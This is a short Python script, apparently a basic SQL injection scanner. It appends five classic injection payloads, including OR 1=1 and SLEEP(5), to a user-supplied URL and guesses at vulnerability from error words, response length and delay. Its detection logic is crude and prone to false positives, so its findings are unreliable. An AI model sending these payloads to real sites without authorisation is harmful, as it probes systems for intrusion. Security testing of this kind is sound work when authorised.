import requests
import time

def run():
    print("\n🔍 SQL Injection Scanner\n")

    url = input("Enter URL: ")

    payloads = [
        "'",
        "' OR '1'='1",
        "' OR 1=1 --",
        "' AND 1=2 --",
        "' OR SLEEP(5) --"
    ]

    print("\n🔍 Testing for SQL Injection...\n")

    try:
        baseline = requests.get(url, timeout=5)
        baseline_len = len(baseline.text)
    except requests.exceptions.RequestException as e:
        print("❌ Failed to connect:", e)
        return

    print("Baseline length:", baseline_len)

    for payload in payloads:
        test_url = url + payload
        print(f"\n➡️ Testing: {payload}")

        vulnerable = False

        start = time.time()
        try:
            r = requests.get(test_url, timeout=10)
            end = time.time()
        except requests.exceptions.RequestException:
            print("❌ Request failed")
            continue

        response_time = end - start
        response_len = len(r.text)

        # 1. Error-based detection
        if any(err in r.text.lower() for err in ["sql", "mysql", "syntax", "error"]):
            print("💥 SQL Error detected")
            vulnerable = True

        # 2. Boolean-based detection
        if response_len != baseline_len:
            print("⚠️ Response changed")
            vulnerable = True

        # 3. Time-based detection
        if response_time > 4:
            print("⏱️ Delayed response")
            vulnerable = True

        # Final result
        if vulnerable:
            print("🚨 Possible SQL Injection")
        else:
            print("✅ No vulnerability detected")


# 🔒 This ensures it only runs when executed directly, not when imported
if __name__ == "__main__":
    run()